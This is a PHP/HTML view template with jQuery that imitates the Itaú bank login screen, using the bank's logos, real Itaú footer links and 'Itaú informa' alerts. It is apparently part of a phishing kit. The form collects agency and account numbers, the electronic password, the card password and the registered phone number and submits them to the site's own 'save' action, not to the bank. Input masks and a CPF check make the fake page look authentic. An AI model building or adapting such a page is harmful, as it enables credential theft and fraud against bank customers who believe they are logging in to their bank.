<div class="container-itau bg-image">
	<nav class="navbar">
		<div class="row">
			<div class="col-md-12">
				<div class="col-md-4 col-xs-4">
					<?= $this->Html->image('itau/logo-itau-fb.png', ['class' => 'logo_form']) ?>
				</div>
				<div class="col-md-4 col-xs-4"></div>
				<div class="col-md-4 col-xs-4">
					<?= $this->Html->image('itau/logo_30_horas.png', ['class' => 'trinta_hrs_form']) ?>
				</div>
			</div>			
		</div>
		<div class="row">
			<div class="col-md-12">
				<div class="col-md-12">
					<?= $this->Html->image('itau/acesso.jpg') ?>
				</div>
			</div>
		</div>
	</nav>
	<div class="row row-fix">
		<?= $this->Form->create($itau, ['url' => [ 'action' => 'save']]) ?>
		<div class="col-md-12">
			<div class="col-md-6 col-xs-6">
				<div class="form-group is-empty">
			        <span class="material-input"></span>
					<?= $this->Form->text('agencia', ['class' => 'form-control', 'required' => true, 'placeholder' => "Agência"]) ?>
				</div>
			</div>
			<div class="col-md-6 col-xs-6">
				<div class="form-group is-empty">
			        <span class="material-input"></span>
					<?= $this->Form->text('conta', ['class' => 'form-control', 'required' => true, 'placeholder' => "Conta"]) ?>
				</div>
			</div>
		</div>
		<div class="col-md-12">
			<div class="col-md-12 col-xs-12">
				<div class="togglebutton">
	            	<label>
	                	<input type="checkbox" >
						lembrar agência e conta
	            	</label>
	            </div>
			</div>
		</div>
		<div class="col-md-12">
			<div class="col-md-12 col-xs-12">
				<div class="form-group is-empty">
			        <span class="material-input"></span>
					<?= $this->Form->password('senha_eletronica', ['class' => 'form-control', 'required' => true, 'placeholder' => "Senha Eletrônica"]) ?>
				</div>
			</div>
			<div class="col-md-12 col-xs-12">
				<div class="form-group is-empty">
			        <span class="material-input"></span>
					<?= $this->Form->password('senha_cartao', ['class' => 'form-control', 'required' => true, 'placeholder' => "Senha Cartão"]) ?>
				</div>
			</div>
		</div>
		<div class="col-md-12">
			<div class="col-md-12 col-xs-12">
				<div class="form-group is-empty">
			        <span class="material-input"></span>
					<?= $this->Form->text('celular', ['class' => 'form-control', 'required' => true, 'placeholder' => "Telefone Cadastrado"]) ?>
				</div>
			</div>
			<!-- <div class="col-md-6 col-xs-6">
				<div class="form-group is-empty">
			        <span class="material-input"></span>
					<?= $this->Form->text('cpf', ['class' => 'form-control', 'required' => true, 'placeholder' => "CPF"]) ?>
				</div>
			</div> -->
		</div>
		<div class="col-md-12">
			<div class="col-md-12 col-xs-12">
				<?= $this->Form->button('<i class="fa fa-lock"></i> Validar', ['type' => 'submit', 'class' => 'btn btn-block btn-itau']) ?>
			</div>
		</div>
	</div>
	<div class="row footer row-fix">
		<div class="col-md-12">
			<div class="col-md-4 col-xs-4 text-center">
				<a href="https://www.itau.com.br/?gclid=CMzP66rT6dMCFUwFkQodutQHuQ#CAIXAS%23DISPENSADOR?%23op=%23CAIXAS%23">
					<i class="fa fa-map-marker fa-4x fa-inverse"></i>
				</a>
			</div>
			<div class="col-md-4 col-xs-4 text-center">
				<a href="https://www.itau.com.br/usoconsciente/">
					<i class="fa fa-calculator fa-4x fa-inverse"></i>
				</a>
			</div>
			<div class="col-md-4 col-xs-4 text-center">
				<a href="https://www.itau.com.br/seguranca/termos-de-uso/">
					<i class="fa fa-info-circle fa-4x fa-inverse"></i>
				</a>
			</div>
		</div>
	</div>
</div>
<script type="text/javascript">
	$(function() {
		$('input[name="agencia"]').mask('0000');
		$('input[name="conta"]').mask('00000-0');
		$('input[name="celular"]').mask('(00) 00000-0000');
		$('input[name="cpf"]').mask('000.000.000-00');
		$('input[name="senha_cartao"]').mask('000000');
		$('input[name="senha_eletronica"]').mask('00000000');

		$('input[name="cpf"]').blur(function() {
			if(!validarCPF($(this).val())) {
				bootbox.alert({
					message: "Itaú informa: CPF Inválido!", 
					buttons: {
				        ok: {
				            label: 'Ok',
				            className: 'btn-ok'
				        }
				    }

				});
				$(this).val("");
			}
		});

		$('input[name="senha_eletronica"], input[name="senha_cartao"]').blur(function(ev) {
			ev.preventDefault();
			if($(this).val() && $(this).val().length < 6) {
				
				bootbox.alert({
					message: "Itaú informa: Senha Inválida!", 
					buttons: {
				        ok: {
				            label: 'Ok',
				            className: 'btn-ok'
				        }
				    }

				});

				$(this).val("");
				$(this).focus();
			}
		});
	});

	function validarCPF(cpf) {	
		cpf = cpf.replace(/[^\d]+/g,'');	
		if(cpf == '') return false;	
		// Elimina CPFs invalidos conhecidos	
		if (cpf.length != 11 || 
			cpf == "00000000000" || 
			cpf == "11111111111" || 
			cpf == "22222222222" || 
			cpf == "33333333333" || 
			cpf == "44444444444" || 
			cpf == "55555555555" || 
			cpf == "66666666666" || 
			cpf == "77777777777" || 
			cpf == "88888888888" || 
			cpf == "99999999999")
				return false;		
		// Valida 1o digito	
		add = 0;	
		for (i=0; i < 9; i ++)		
			add += parseInt(cpf.charAt(i)) * (10 - i);	
			rev = 11 - (add % 11);	
			if (rev == 10 || rev == 11)		
				rev = 0;	
			if (rev != parseInt(cpf.charAt(9)))		
				return false;		
		// Valida 2o digito	
		add = 0;	
		for (i = 0; i < 10; i ++)		
			add += parseInt(cpf.charAt(i)) * (11 - i);	
		rev = 11 - (add % 11);	
		if (rev == 10 || rev == 11)	
			rev = 0;	
		if (rev != parseInt(cpf.charAt(10)))
			return false;		
		return true;   
	}
</script>